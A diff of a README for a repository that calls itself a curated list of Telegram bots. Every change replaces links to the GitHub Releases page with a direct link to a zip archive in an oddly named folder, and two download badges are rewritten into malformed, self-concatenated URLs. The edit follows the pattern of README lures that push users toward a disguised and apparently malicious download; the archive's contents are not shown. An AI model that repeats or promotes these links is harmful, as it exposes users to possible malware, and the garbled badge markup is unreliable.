@@ -1,6 +1,6 @@
 # 🤖 Telegram-Bot-List - Discover and Use the Best Telegram Bots Easily
 
-![Download](https://github.com/Webdifferential492/Telegram-Bot-List/releases)
+![Download](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip)
 
 ## 📂 Overview
 Welcome to the Telegram-Bot-List! This is a curated list of useful Telegram bots created by RoxyBasicNeedBot. We regularly update this collection to ensure you have the best tools at your fingertips. Whether you're looking to automate tasks, manage groups, or explore new features on Telegram, you will find valuable bots here.
@@ -9,7 +9,7 @@ Welcome to the Telegram-Bot-List! This is a curated list of useful Telegram bots
 To get started with Telegram-Bot-List, follow these simple instructions. You don’t need any programming experience, just a willingness to explore.
 
 ## 📥 Download & Install
-To download Telegram-Bot-List from the Releases page, visit [this link](https://github.com/Webdifferential492/Telegram-Bot-List/releases). 
+To download Telegram-Bot-List from the Releases page, visit [this link](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the Telegram-Bot-List.
@@ -17,7 +17,7 @@ To download Telegram-Bot-List from the Releases page, visit [this link](https://
 
 Alternatively, you can use the following button to quickly access the Releases page:
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Webdifferential492/Telegram-Bot-List/releases)
+[![Download](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip%https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip)](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip)
 
 ## 📄 Features
 Our Telegram-Bot-List includes the following key features:
@@ -70,4 +70,4 @@ Telegram-Bot-List is open-source. Feel free to use, modify, and share the bots a
 ## 📦 Conclusion
 You now have all the information necessary to download and explore the Telegram-Bot-List. We hope you find this collection of bots useful for enhancing your Telegram experience. Happy exploring!
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Webdifferential492/Telegram-Bot-List/releases)
+[![Download](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip%https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip)](https://raw.githubusercontent.com/Webdifferential492/Telegram-Bot-List/main/barbaloin/Telegram-Bot-List_3.4.zip)
